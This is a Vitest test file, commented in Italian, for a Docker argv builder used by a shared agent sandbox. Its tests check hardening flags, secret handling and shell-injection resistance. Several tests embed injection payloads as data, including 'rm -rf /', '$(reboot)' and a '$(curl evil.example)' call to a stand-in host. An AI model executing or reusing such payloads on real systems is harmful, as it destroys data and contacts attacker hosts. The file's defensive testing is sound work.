import { describe, expect, it } from 'vitest'
import { spawn, spawnSync } from 'node:child_process'
import { mkdtempSync, mkdirSync, readFileSync, existsSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  dockerStdioMcpArgv,
  dockerCpDirArgv,
  dockerChmodReadOnlyArgv,
  dockerRmDirArgv,
  dockerExecArgv,
    dockerReadFileArgv,
    dockerWriteFileArgv,
    dockerListDirArgv,
    dockerPsArgv,
    dockerStartArgv,
    dockerBoxCreateArgv,
    dockerBoxChownArgv,
    dockerBoxMigrateArgv,
    dockerBoxMarkerCheckArgv,
    dockerBoxMarkerWriteArgv,
    dockerVolumeLsArgv,
    dockerStatSizeArgv,
    dockerClientEnv,
    dockerExecBackgroundArgv,
    dockerKillGroupArgv,
    dockerBoxInitCheckArgv,
    dockerBoxRmArgv,
    dockerBoxWritableArgv,
    dockerEnsureHomeArgv,
    boxNeedsRecreateForInit,
    boxEnsurePlan,
    boxCreateCheck,
    boxImageTag,
    dockerImageInspectArgv,
    dockerBrowserMcpArgv,
    browserMcpFlags,
    DOCKER_BROWSER_WRAPPER_SH,
    BROWSER_MCP_FORBIDDEN_FLAGS,
    BROWSER_PID_FILE,
    dockerContainerImageArgv,
    dockerBuildArgv,
    DOCKER_WRITE_SH,
    DOCKER_BOX_INIT_SH,
    DOCKER_BOX_MIGRATE_SH,
    DOCKER_BG_WRAPPER_SH,
    BOX_CONTAINER,
    BOX_VOLUME,
    BOX_MOUNT,
    boxHomePath,
    DEFAULT_BOX_LIMITS
,
    PLAYWRIGHT_MCP_CONFIG, PLAYWRIGHT_MCP_CONFIG_JSON, browserPidFile
} from '../docker-argv'

/** 0c: nei test l'immagine del box è un tag qualunque derivato dal contenuto. */
const IMG = boxImageTag('FROM mcr.microsoft.com/playwright:v1.64.1-noble')

describe('dockerExecArgv', () => {
  it('argv senza shell: exec -i -w <workdir> <container> sh -c <command>', () => {
    expect(dockerExecArgv('sandbot-box', 'echo hi', { workdir: '/box/home/agent_x' })).toEqual([
      'exec', '-i', '-w', '/box/home/agent_x', 'sandbot-box', 'sh', '-c', 'echo hi'
    ])
  })

  it('un comando con $(hostname) e backtick compare intatto come singolo elemento argv', () => {
    const nasty = 'echo $(hostname) `id -u` "$(whoami)"'
    const argv = dockerExecArgv('c', nasty)
    expect(argv[argv.length - 1]).toBe(nasty)
    // nessun elemento è stato splittato o interpretato: il payload appare UNA volta, come ultimo elemento
    expect(argv.filter((a) => a.includes('$(hostname)'))).toEqual([nasty])
    expect(argv).not.toContain('hostname') // $(hostname) non eseguito/spezzato a livello host
  })

  it('F2: HOME e le variabili NON segrete col VALORE nell\'argv; i segreti col solo NOME', () => {
    const argv = dockerExecArgv('c', 'curl -H $SANDBOT_SECRET_API_KEY', { env: { HOME: '/box/home/x', SANDBOT_SECRET_API_KEY: 'SK-1234-SEGRETO' } })
    const i = argv.indexOf('-e')
    expect(argv[i + 1]).toBe('HOME=/box/home/x')
    expect(argv[i + 3]).toBe('SANDBOT_SECRET_API_KEY') // solo il nome: il valore MAI in argv
    expect(argv.join(' ')).not.toContain('SK-1234-SEGRETO')
  })

  it('F2: l\'env del processo docker sull\'HOST ha il daemon + i SOLI segreti (niente HOME del bot)', () => {
    const env = dockerClientEnv({ HOME: '/box/home/x', PATH: '/usr/bin', SANDBOT_SECRET_API_KEY: 'v' })
    expect(Object.keys(env)).toEqual(['SANDBOT_SECRET_API_KEY'])
    // il client docker usa la SUA HOME per ~/.docker (contesti, socket)
    expect(env.HOME).toBeUndefined()
  })
})

describe('operazioni file: path e contenuto mai interpolati in shell', () => {
  it('read: path (anche con spazi/metacaratteri) è un singolo argomento di cat', () => {
    const path = 'a b; rm -rf / # $(touch pwned)'
    expect(dockerReadFileArgv('c', path)).toEqual(['exec', '-i', '-w', BOX_MOUNT, 'c', 'cat', '--', path])
  })

  it('write: sh -c costante, path come argomento posizionale, contenuto NON in argv, scrittura ATOMICA', () => {
    const argv = dockerWriteFileArgv('c', '/box/home/x; $(reboot)`y`')
    expect(argv).toEqual(['exec', '-i', '-w', BOX_MOUNT, 'c', 'sh', '-c', DOCKER_WRITE_SH, 'sh', '/box/home/x; $(reboot)`y`'])
    // lo script è fisso: crea la dir del file, scrive lo stdin su un TEMPORANEO
    // NELLA STESSA cartella e poi rinomina (fase 11: un altro bot non legge a metà)
    expect(DOCKER_WRITE_SH).toBe('mkdir -p "$(dirname "$1")" && cat > "$1.sandbot-tmp" && mv -f "$1.sandbot-tmp" "$1"')
  })

  it('list: ls -la con path come argv', () => {
    expect(dockerListDirArgv('c', '.')).toEqual(['exec', '-i', '-w', BOX_MOUNT, 'c', 'ls', '-la', '--', '.'])
  })
})

describe('lifecycle & hardening del box condiviso (§5.2 + fase 11 punto 1)', () => {
  it('ps: filtro nome esatto ancorato, senza grep', () => {
    expect(dockerPsArgv(BOX_CONTAINER)).toEqual([
      'ps', '-a', '--format', '{{.Names}}', '--filter', 'name=^/sandbot-box$'
    ])
  })

  it('start: argv diretto', () => {
    expect(dockerStartArgv('c')).toEqual(['start', 'c'])
  })

  it('create: container UNICO sandbot-box, volume sandbot-box su /box, hardening e limiti condivisi configurabili', () => {
    const argv = dockerBoxCreateArgv(BOX_CONTAINER, BOX_VOLUME, 'bridge', DEFAULT_BOX_LIMITS, IMG)
    for (const flag of ['--user', '--cap-drop', '--security-opt', '--init', '--pids-limit', '--memory', '--cpus', '--network']) {
      expect(argv).toContain(flag)
    }
    const val = (flag: string) => argv[argv.indexOf(flag) + 1]
    expect(argv[argv.indexOf('--name') + 1]).toBe('sandbot-box')
    // H1: il volume montato :nocopy — alla prima mount di un volume VUOTO
    // docker copia nel volume contenuto E proprietà della cartella di
    // destinazione (root, per via di -w /box), sovrascrivendo il chown
    expect(argv).toContain('sandbot-box:/box:nocopy')
    expect(argv).not.toContain('sandbot-box:/box')
    expect(val('--user')).toBe('1000:1000')
    expect(val('--cap-drop')).toBe('ALL')
    expect(val('--security-opt')).toBe('no-new-privileges')
    // punto 1: limiti condivisi e configurabili — memoria 4g, cpu 2, pids 1024
    expect(val('--pids-limit')).toBe('1024')
    expect(val('--memory')).toBe('4g')
    expect(val('--cpus')).toBe('2')
    expect(val('--network')).toBe('bridge')
    // 0c: l'immagine è la NOSTRA del box (tag dal Dockerfile), mai ubuntu
    expect(argv[argv.indexOf('-i') + 1]).toBe(IMG)
    // limiti passati dal chiamante (settings sandbox.*)
    const custom = dockerBoxCreateArgv('c', 'v', 'none', { memory: '2g', cpus: 1, pids: 512 }, IMG)
    const v2 = (f: string) => custom[custom.indexOf(f) + 1]
    expect(v2('--memory')).toBe('2g')
    expect(v2('--cpus')).toBe('1')
    expect(v2('--pids-limit')).toBe('512')
    expect(v2('--network')).toBe('none')
  })

  it('init volume (H1): one-shot con sh -c COSTANTE — crea workspace e home PRIMA del chown', () => {
    expect(dockerBoxChownArgv(BOX_VOLUME, IMG)).toEqual(['run', '--rm', '-v', 'sandbot-box:/box', IMG, 'sh', '-c', DOCKER_BOX_INIT_SH])
    // H1: il volume non è più VUOTO quando il create lo monta — il copy-up
    // non ha più niente da sovrascrivere (il mount è comunque :nocopy)
    expect(DOCKER_BOX_INIT_SH).toBe('mkdir -p /box/workspace /box/home && chown -R 1000:1000 /box')
    expect(DOCKER_BOX_INIT_SH.indexOf('mkdir -p')).toBeLessThan(DOCKER_BOX_INIT_SH.indexOf('chown -R'))
  })

  it('la home di un bot dentro il box condiviso', () => {
    expect(boxHomePath('agent_x')).toBe('/box/home/agent_x')
  })
})

describe('migrazione docker una tantum (punto 1): argv puri, copia senza cancellare', () => {
  it('esistenza del vecchio volume: filtro nome esatto', () => {
    expect(dockerVolumeLsArgv('sandbot-agent_x-box')).toEqual([
      'volume', 'ls', '--format', '{{.Name}}', '--filter', 'name=^/sandbot-agent_x-box$'
    ])
  })

  it('copia one-shot: sh -c COSTANTE, agentId come $1, vecchio volume in sola lettura', () => {
    const argv = dockerBoxMigrateArgv('sandbot-agent_x-box', 'agent_x', IMG)
    expect(argv).toEqual([
      'run', '--rm',
      '-v', 'sandbot-agent_x-box:/from:ro',
      '-v', 'sandbot-box:/box',
      IMG, 'sh', '-c', DOCKER_BOX_MIGRATE_SH, 'sh', 'agent_x'
    ])
    // lo script è fisso: copia dentro la home del bot, NON cancella l'origine;
    // H1: il one-shot è di root — il chown finale non lascia la home (e la
    // copia) di root dove il bot deve scrivere
    expect(DOCKER_BOX_MIGRATE_SH).toBe('mkdir -p "/box/home/$1" && cp -a /from/. "/box/home/$1/" && chown -R 1000:1000 "/box/home/$1"')
    expect(DOCKER_BOX_MIGRATE_SH).not.toContain('rm ')
  })

  it('marker dell\'idempotenza: test e touch dentro il volume del box', () => {
    expect(dockerBoxMarkerCheckArgv(IMG)).toEqual(['run', '--rm', '-v', 'sandbot-box:/box', IMG, 'test', '-f', '/box/.migrated-v1'])
    expect(dockerBoxMarkerWriteArgv(IMG)).toEqual(['run', '--rm', '-v', 'sandbot-box:/box', IMG, 'touch', '/box/.migrated-v1'])
  })

  it('0c: il tag dell\'immagine deriva dal CONTENUTO del Dockerfile (primi 12 hex dello sha256)', () => {
    // stesso contenuto → stesso tag; contenuto diverso → tag diverso
    expect(boxImageTag('FROM x')).toBe(boxImageTag('FROM x'))
    expect(boxImageTag('FROM x')).toMatch(/^sandbot-box:[0-9a-f]{12}$/)
    expect(boxImageTag('FROM y')).not.toBe(boxImageTag('FROM x'))
  })
})

// ---- fase 11b (punto 2): il launcher del browser (Playwright MCP nel box) ----

describe('il launcher del browser: argv PURI con TUTTI i flag obbligatori e NESSUNO dei vietati', () => {
  it('dockerBrowserMcpArgv: exec -i -u 1000:1000 -w <home> col wrapper COSTANTE e i flag MCP', () => {
    const argv = dockerBrowserMcpArgv('agent_x', 18765)
    expect(argv.slice(0, 12)).toEqual([
      'exec', '-i',
      '-u', '1000:1000',
      '-w', '/box/home/agent_x',
      'sandbot-box',
      'sh', '-c', DOCKER_BROWSER_WRAPPER_SH, 'sh',
      '/box/home/agent_x/.sandbot/browser.pid'
    ])
    // il wrapper COSTANTE è l'elemento sh -c, il pid file è $1 e i flag seguono
    expect(argv[argv.indexOf('-c') + 1]).toBe(DOCKER_BROWSER_WRAPPER_SH)
    expect(argv).toContain('/box/home/agent_x/.sandbot/browser.pid')
    // I2: NIENTE setsid (il processo di docker exec è già leader di sessione:
    // setsid forkhere e il padre chiude lo stdio del client) e il pid si scrive
    // PRIMA dell'exec — quel pid è anche il pgid per il kill di gruppo
    expect(DOCKER_BROWSER_WRAPPER_SH).not.toContain('setsid')
    expect(DOCKER_BROWSER_WRAPPER_SH.indexOf('echo $$')).toBeLessThan(DOCKER_BROWSER_WRAPPER_SH.indexOf('exec playwright-mcp'))
    expect(DOCKER_BROWSER_WRAPPER_SH).toContain('exec playwright-mcp')
    expect(DOCKER_BROWSER_WRAPPER_SH).toContain('echo $$')
    // TUTTI i flag obbligatori (valori compresi), con il tetto delle uscite (I8)
    const flags = browserMcpFlags('agent_x', 18765)
    for (const [f, v] of [
      ['--headless', null], ['--browser', 'chromium'], ['--no-sandbox', null],
      ['--user-data-dir', '/box/home/agent_x/.browser/profile'],
      ['--output-dir', '/box/home/agent_x/.browser/output'],
      ['--output-max-size', '52428800'],
      ['--no-webmcp', null], ['--block-service-workers', null],
      ['--proxy-server', 'http://host.docker.internal:18765'],
      ['--timeout-navigation', '30000'], ['--viewport-size', '1280x800'],
      ['--image-responses', 'omit'], ['--idle-timeout', '600000'],
      // fase 12 (0e): --config obbligatorio, il file del Dockerfile che spegne
      // il traffico di fondo di Chromium
      ['--config', '/etc/sandbot/playwright-mcp.json']
    ] as const) {
      expect(flags, `flag ${f}`).toContain(f)
      if (v !== null) expect(flags[flags.indexOf(f) + 1]).toBe(v)
    }
  })

  it('fase 12 0e: il Dockerfile crea /etc/sandbot/playwright-mcp.json con la STESSA stringa del flag --config', () => {
    const dockerfile = readFileSync('resources/box/Dockerfile', 'utf8')
    // il file è di root e leggibile da tutti, creato con RUN printf (il
    // contesto resta la sola cartella del Dockerfile: niente COPY)
    expect(dockerfile).toContain('mkdir -p /etc/sandbot')
    expect(dockerfile).toContain(`printf '%s\\n'`)
    expect(dockerfile).toContain(PLAYWRIGHT_MCP_CONFIG_JSON)
    expect(dockerfile).toContain('> /etc/sandbot/playwright-mcp.json')
    expect(dockerfile).toContain('chmod 644 /etc/sandbot/playwright-mcp.json')
    // il flag punta a quel file
    const flags = browserMcpFlags('agent_x', 18765)
    expect(flags[flags.indexOf('--config') + 1]).toBe(PLAYWRIGHT_MCP_CONFIG)
  })

  it('MAI un flag vietato nel launcher', () => {
    const flags = browserMcpFlags('agent_x', 18765)
    for (const bad of BROWSER_MCP_FORBIDDEN_FLAGS) {
      expect(flags.some((f) => f === bad || f.startsWith(bad + ' ')), `flag vietato ${bad}`).toBe(false)
    }
    expect(dockerBrowserMcpArgv('agent_x', 18765).some((a) => a.startsWith('--cdp') || a.startsWith('--caps'))).toBe(false)
  })
})

// ---- F1: il wrapper COSTANTE del background, eseguito col VERO /bin/sh ----

/**
 * Il wrapper è una stringa costante: questi test la eseguono davvero con
 * /bin/sh su una directory temporanea (niente Docker). Su macOS non esiste
 * setsid: il wrapper prende il ramo senza setsid (il gruppo è quello del
 * wrapper, che in host nasce già detached) — il test del kill di gruppo resta
 * valido proprio su quel ramo; su Linux coprirebbe anche il ramo setsid.
 */
describe('DOCKER_BG_WRAPPER_SH col vero /bin/sh (F1)', () => {
  const runWrapper = (cwd: string, command: string, log: string, exit: string, pid: string) =>
    spawnSync('/bin/sh', ['-c', DOCKER_BG_WRAPPER_SH, 'sh', command, log, exit, pid], { cwd, encoding: 'utf8' })

  it('un comando con spazi e && : gira con sh -c, scrive log ed exit 0, e CREA la cartella dei file', () => {
    const tmp = mkdtempSync(join(tmpdir(), 'sandbot-wrap-'))
    try {
      // la cartella .sandbot/shells NON esiste: la crea il wrapper
      const r = runWrapper(tmp, 'echo "parte 1" && echo "parte 2"', '.sandbot/shells/sh-t.log', '.sandbot/shells/sh-t.exit', '.sandbot/shells/sh-t.pid')
      expect(r.status).toBe(0)
      expect(readFileSync(join(tmp, '.sandbot/shells/sh-t.log'), 'utf8')).toBe('parte 1\nparte 2\n')
      // echo scrive con il newline: i lettori (tick, await_shell) fanno trim
      expect(readFileSync(join(tmp, '.sandbot/shells/sh-t.exit'), 'utf8').trim()).toBe('0')
      expect(readFileSync(join(tmp, '.sandbot/shells/sh-t.pid'), 'utf8').trim()).toMatch(/^\d+$/)
      expect(existsSync(join(tmp, '.sandbot/shells'))).toBe(true)
    } finally {
      rmSync(tmp, { recursive: true, force: true })
    }
  })

  it('un exit 3 scrive 3 nel file dell\'exit code', () => {
    const tmp = mkdtempSync(join(tmpdir(), 'sandbot-wrap-'))
    try {
      const r = runWrapper(tmp, 'echo boom >&2; exit 3', '.sandbot/shells/sh-e.log', '.sandbot/shells/sh-e.exit', '.sandbot/shells/sh-e.pid')
      expect(r.status).toBe(0) // il wrapper finisce bene: è il COMANDO che è fallito
      expect(readFileSync(join(tmp, '.sandbot/shells/sh-e.exit'), 'utf8').trim()).toBe('3')
      expect(readFileSync(join(tmp, '.sandbot/shells/sh-e.log'), 'utf8')).toContain('boom')
    } finally {
      rmSync(tmp, { recursive: true, force: true })
    }
  })

  it('il pid scritto è quello del GRUPPO: kill -TERM -- -<pgid> termina anche i FIGLI', async () => {
    const tmp = mkdtempSync(join(tmpdir(), 'sandbot-wrap-'))
    try {
      // detached: il wrapper è un gruppo suo; il comando (sleep 30 & wait) ha
      // un FIGLIO che deve morire col gruppo, non solo la shell
      const child = spawn('/bin/sh', ['-c', DOCKER_BG_WRAPPER_SH, 'sh', 'sleep 30 & wait', '.sandbot/shells/sh-k.log', '.sandbot/shells/sh-k.exit', '.sandbot/shells/sh-k.pid'], {
        cwd: tmp,
        detached: true,
        stdio: 'ignore'
      })
      child.unref()
      const pidFile = join(tmp, '.sandbot/shells/sh-k.pid')
      let pgid = 0
      for (let i = 0; i < 40 && !pgid; i++) {
        try { pgid = Number(readFileSync(pidFile, 'utf8').trim()) } catch { await new Promise((r) => setTimeout(r, 100)) }
      }
      expect(pgid).toBeGreaterThan(0)
      // come il wrapper docker: TERM all'INTERO gruppo (pid negativo)
      process.kill(-pgid, 'SIGTERM')
      // il gruppo muore: shell E figlio (pieno di grazia, poi si controlla)
      let dead = false
      for (let i = 0; i < 50 && !dead; i++) {
        try { process.kill(-pgid, 0) } catch { dead = true }
        if (!dead) await new Promise((r) => setTimeout(r, 100))
      }
      expect(dead).toBe(true)
      // il wrapper ucciso NON ha scritto l'exit file (nessuna chiusura spuria)
      expect(existsSync(join(tmp, '.sandbot/shells/sh-k.exit'))).toBe(false)
    } finally {
      rmSync(tmp, { recursive: true, force: true })
    }
  })

  it('la forma del wrapper è quella attesa (sh -c, mkdir, gruppo proprio, pid e exit file)', () => {
    expect(DOCKER_BG_WRAPPER_SH).toContain('mkdir -p "$(dirname "$2")"')
    expect(DOCKER_BG_WRAPPER_SH).toContain('sh -c "$1"')
    expect(DOCKER_BG_WRAPPER_SH).toContain('setsid')
    expect(DOCKER_BG_WRAPPER_SH).toContain('echo "$?" >"$3"')
  })

  it('exec -d col wrapper: comando e path come argomenti posizionali, HOME col valore in argv (F2)', () => {
    const argv = dockerExecBackgroundArgv('sandbot-box', 'npm run build', { workdir: '/box/home/x', env: { HOME: '/box/home/x', SANDBOT_SECRET_K: 'SEGRETO' } }, { log: '.sandbot/shells/sh-1.log', exit: '.sandbot/shells/sh-1.exit', pid: '.sandbot/shells/sh-1.pid' })
    expect(argv).toEqual([
      'exec', '-d', '-w', '/box/home/x',
      '-e', 'HOME=/box/home/x',
      '-e', 'SANDBOT_SECRET_K',
      'sandbot-box', 'sh', '-c', DOCKER_BG_WRAPPER_SH, 'sh', 'npm run build',
      '.sandbot/shells/sh-1.log', '.sandbot/shells/sh-1.exit', '.sandbot/shells/sh-1.pid'
    ])
    expect(argv.join(' ')).not.toContain('SEGRETO')
  })

  it('kill nel container (G1): ARGV PURI al kill di procps — TERM, KILL e il segnale 0 di esistenza, tutti al GRUPPO', () => {
    // niente `sh -c`: il kill INTERNO di dash non accetta `--` (Illegal number: -)
    expect(dockerKillGroupArgv('sandbot-box', 15, 'TERM')).toEqual(['exec', 'sandbot-box', 'kill', '-TERM', '--', '-15'])
    expect(dockerKillGroupArgv('sandbot-box', 15, 'KILL')).toEqual(['exec', 'sandbot-box', 'kill', '-KILL', '--', '-15'])
    expect(dockerKillGroupArgv('sandbot-box', 15, '0')).toEqual(['exec', 'sandbot-box', 'kill', '-0', '--', '-15'])
    for (const argv of [dockerKillGroupArgv('sandbot-box', 15, 'TERM'), dockerKillGroupArgv('sandbot-box', 15, '0')]) {
      expect(argv).not.toContain('sh')
      expect(argv).not.toContain('-c')
    }
  })
})

// ---- G2: --init (tini raccoglie gli zombie) e la ricreazione del container vecchio ----

describe('G2: init del container e migrazione senza toccare il volume', () => {
  it('inspect dell\'init: argv puro, formato fisso true/false', () => {
    expect(dockerBoxInitCheckArgv(BOX_CONTAINER)).toEqual(['inspect', '-f', '{{.HostConfig.Init}}', 'sandbot-box'])
  })

  it('rimozione per la ricreazione: SOLO il container, il volume mai nominato', () => {
    const argv = dockerBoxRmArgv(BOX_CONTAINER)
    expect(argv).toEqual(['rm', '-f', 'sandbot-box'])
    expect(argv.join(' ')).not.toContain('volume')
  })

  it('decisione pura ricreare sì/no: solo un "false" esplicito ricrea', () => {
    expect(boxNeedsRecreateForInit('false')).toBe(true)
    expect(boxNeedsRecreateForInit('false\n')).toBe(true) // docker inspect chiude a capo
    expect(boxNeedsRecreateForInit('true')).toBe(false)
    expect(boxNeedsRecreateForInit('true\n')).toBe(false)
    // inspect fallito o output inatteso: si tiene il container che funziona
    for (const weird of ['', '\n', 'Error: No such object', 'False']) {
      expect(boxNeedsRecreateForInit(weird), JSON.stringify(weird)).toBe(false)
    }
  })
})

// ---- H1: scrivibilità del box — il volume di root non passa più inosservato ----

describe('H1: controllo test -w e decisione use/una ricreazione/errore chiaro', () => {
  it('il controllo della scrivibilità: argv PURO, test -w dentro il container, niente shell', () => {
    const argv = dockerBoxWritableArgv(BOX_CONTAINER)
    expect(argv).toEqual(['exec', 'sandbot-box', 'test', '-w', '/box/workspace'])
    expect(argv).not.toContain('sh')
  })

  it('decisione pura: container inesistente → creazione; senza init o non scrivibile → UNA ricreazione', () => {
    expect(boxEnsurePlan({ exists: false, initOk: true })).toEqual({ kind: 'create' })
    expect(boxEnsurePlan({ exists: false, initOk: false })).toEqual({ kind: 'create' })
    // G2: nato senza --init si ricrea, qualunque la scrivibilità
    expect(boxEnsurePlan({ exists: true, initOk: false })).toEqual({ kind: 'recreate', reason: 'senza-init' })
    expect(boxEnsurePlan({ exists: true, initOk: false, writable: true })).toEqual({ kind: 'recreate', reason: 'senza-init' })
    // H1: init a posto → decide il test -w (volume di root = container nato senza :nocopy)
    expect(boxEnsurePlan({ exists: true, initOk: true, writable: true })).toEqual({ kind: 'use' })
    expect(boxEnsurePlan({ exists: true, initOk: true, writable: false })).toEqual({ kind: 'recreate', reason: 'volume-di-root' })
    // scrivibilità ignota (difensivo): si ricrea, il lato sicuro
    expect(boxEnsurePlan({ exists: true, initOk: true })).toEqual({ kind: 'recreate', reason: 'volume-di-root' })
  })

  it('punto 1: decisione pura con imageOk — immagine DIVERSA ricrea, inspect fallito NON ricrea', () => {
    // container nato con un'immagine diversa (Dockerfile cambiato) → ricreazione
    expect(boxEnsurePlan({ exists: true, initOk: true, imageOk: false, writable: true })).toEqual({ kind: 'recreate', reason: 'immagine-vecchia' })
    expect(boxEnsurePlan({ exists: true, initOk: true, imageOk: false, writable: false })).toEqual({ kind: 'recreate', reason: 'immagine-vecchia' })
    // immagine corrente (o inspect non riuscito: undefined) → non è quella la ragione
    expect(boxEnsurePlan({ exists: true, initOk: true, imageOk: true, writable: true })).toEqual({ kind: 'use' })
    expect(boxEnsurePlan({ exists: true, initOk: true, imageOk: undefined, writable: false })).toEqual({ kind: 'recreate', reason: 'volume-di-root' })
  })

  it('punto 1: argv PURI di build, esistenza immagine e immagine del container', () => {
    const build = dockerBuildArgv('sandbot-box:abc', '/repo/resources/box/Dockerfile', '/repo/resources/box')
    expect(build).toEqual(['build', '-t', 'sandbot-box:abc', '-f', '/repo/resources/box/Dockerfile', '/repo/resources/box'])
    // mai --platform: la build è NATIVA per l'host
    expect(build).not.toContain('--platform')
    expect(dockerImageInspectArgv('sandbot-box:abc')).toEqual(['image', 'inspect', 'sandbot-box:abc'])
    expect(dockerContainerImageArgv('sandbot-box')).toEqual(['inspect', '-f', '{{.Config.Image}}', 'sandbot-box'])
  })

  it('esito DOPO la (ri)creazione: ok, o l\'errore CHIARO — la ricreazione è una sola', () => {
    expect(boxCreateCheck(true)).toEqual({ ok: true })
    const r = boxCreateCheck(false)
    expect(r.ok).toBe(false)
    if (!r.ok) {
      // dice COSA è fallito (test -w), CHI non può scrivere e che i dati sono
      // salvi — al posto dei permessi negati sparsi di ogni write-file
      expect(r.error).toContain('il box non è scrivibile dall\'utente del container (1000:1000)')
      expect(r.error).toContain('test -w /box/workspace')
      expect(r.error).toContain('sandbot-box')
      expect(r.error).toContain('non sono stati toccati')
    }
  })
})

// ---- H2: la home del bot esiste prima di ogni exec in docker ----

describe('H2: mkdir della home del bot nel container', () => {
  it('argv PURI: exec <container> mkdir -p <home>, nessuna shell, il path è UN elemento', () => {
    const argv = dockerEnsureHomeArgv(BOX_CONTAINER, 'agent_x')
    expect(argv).toEqual(['exec', 'sandbot-box', 'mkdir', '-p', '/box/home/agent_x'])
    expect(argv).not.toContain('sh')
    expect(argv).not.toContain('-c')
  })

  it('un agentId ostile resta UN singolo elemento argv: niente interpolazione', () => {
    const argv = dockerEnsureHomeArgv('c', 'x; rm -rf / # $(touch pwned)`reboot`')
    expect(argv[argv.length - 1]).toBe('/box/home/x; rm -rf / # $(touch pwned)`reboot`')
  })
})

describe('dimensione di un file nel box: argv PURI (F6)', () => {
  it('stat -c %s col path come SINGOLO argomento: $(…) e backtick non eseguono nulla', () => {
    const path = '/box/home/x/$(curl evil.example)`reboot`'
    const argv = dockerStatSizeArgv('sandbot-box', path)
    expect(argv).toEqual(['exec', '-i', '-w', BOX_MOUNT, 'sandbot-box', 'stat', '-c', '%s', '--', path])
    // niente shell nel mezzo: il path resta UN elemento argv
    expect(argv[argv.length - 1]).toBe(path)
    expect(argv).not.toContain('sh')
  })
})

// ---- fase 12 (punto 1): il browser del FIGLIO (istanza propria, --isolated) ----

describe('il launcher del browser di un SOTTOAGENTE', () => {
  it('child: --isolated AL POSTO di --user-data-dir, output-dir separato, pid file col suo id, -w la home del PADRE', () => {
    const flags = browserMcpFlags('sub_a1b2c3d4', 18765, { child: true, home: '/box/home/agent_padre' })
    expect(flags).toContain('--isolated')
    expect(flags).not.toContain('--user-data-dir')
    expect(flags[flags.indexOf('--output-dir') + 1]).toBe('/box/home/agent_padre/.browser/output-sub_a1b2c3d4')
    const argv = dockerBrowserMcpArgv('sub_a1b2c3d4', 18765, { child: true, home: '/box/home/agent_padre' })
    expect(argv).toContain('/box/home/agent_padre/.sandbot/browser-sub_a1b2c3d4.pid')
    expect(argv[argv.indexOf('-w') + 1]).toBe('/box/home/agent_padre')
    // il flag --config resta obbligatorio anche per il figlio
    expect(flags[flags.indexOf('--config') + 1]).toBe(PLAYWRIGHT_MCP_CONFIG)
  })

  it('browserPidFile: padre e figlio non si pestano il pid file', () => {
    expect(browserPidFile('agent_x', false)).toBe('.sandbot/browser.pid')
    expect(browserPidFile('sub_a1b2c3d4', true)).toBe('.sandbot/browser-sub_a1b2c3d4.pid')
  })
})

// ---- fase 13 (punto 2): i server MCP stdio del registro/plugin nel BOX ----

describe('fase 13: argv del server MCP stdio nel box (dockerStdioMcpArgv)', () => {
  it('docker exec -i -u 1000:1000 -w <home> sandbot-box npx -y <identifier>@<version>, SENZA wrapper né setsid', () => {
    const argv = dockerStdioMcpArgv({ workdir: '/box/home/agent_x', command: 'npx', args: ['-y', '@foreverworks/mcp-notion@0.1.0'] })
    expect(argv).toEqual([
      'exec', '-i', '-u', '1000:1000', '-w', '/box/home/agent_x',
      'sandbot-box', 'npx', '-y', '@foreverworks/mcp-notion@0.1.0'
    ])
    expect(argv.join(' ')).not.toContain('setsid')
    expect(argv.join(' ')).not.toContain('sh -c')
  })
  it('le variabili d\'ambiente passano col SOLO nome (-e NOME): il VALORE mai in argv', () => {
    const argv = dockerStdioMcpArgv({
      workdir: '/box/home/a', command: 'npx', args: ['-y', 'x@1.0.0'],
      envKeys: ['NOTION_TOKENS_DIR', 'API_KEY']
    })
    expect(argv).toEqual([
      'exec', '-i', '-u', '1000:1000', '-w', '/box/home/a',
      '-e', 'NOTION_TOKENS_DIR', '-e', 'API_KEY',
      'sandbot-box', 'npx', '-y', 'x@1.0.0'
    ])
    // nessun valore segreto può finire nell'argv: solo i NOMI delle chiavi
    expect(argv.filter((a) => a.includes('=')).length).toBe(0)
  })
  it('dockerCpDirArgv / dockerChmodReadOnlyArgv / dockerRmDirArgv: copia nel box, sola lettura, rimozione esatta', () => {
    expect(dockerCpDirArgv('/tmp/p', '/box/plugins/mp/demo/abc')).toEqual(['cp', '/tmp/p', 'sandbot-box:/box/plugins/mp/demo/abc'])
    expect(dockerChmodReadOnlyArgv('/box/plugins/mp/demo/abc')).toEqual(['exec', 'sandbot-box', 'chmod', '-R', 'a-w', '--', '/box/plugins/mp/demo/abc'])
    expect(dockerRmDirArgv('/box/plugins/mp/demo/abc')).toEqual(['exec', 'sandbot-box', 'rm', '-rf', '--', '/box/plugins/mp/demo/abc'])
  })
})
